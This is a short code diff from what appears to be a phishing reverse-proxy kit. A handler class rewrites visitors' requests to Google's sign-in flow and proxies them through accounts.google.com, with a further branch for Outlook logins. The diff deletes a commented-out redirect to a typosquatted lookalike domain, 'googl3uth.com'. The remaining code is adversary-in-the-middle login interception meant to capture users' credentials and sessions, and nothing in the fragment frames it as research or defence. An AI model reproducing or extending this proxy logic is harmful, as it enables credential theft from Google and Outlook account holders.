@@ -208,8 +208,7 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                 clientContext.currentDomain = 'accounts.google.com'
                 return super.superExecuteProxy(clientContext.currentDomain, clientContext)
-                // this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
-                // return this.res.end('')
+                
             }
             if (this.req.url === '/auth/login/outlook') {
                 clientContext.info.disableDeflate = true;
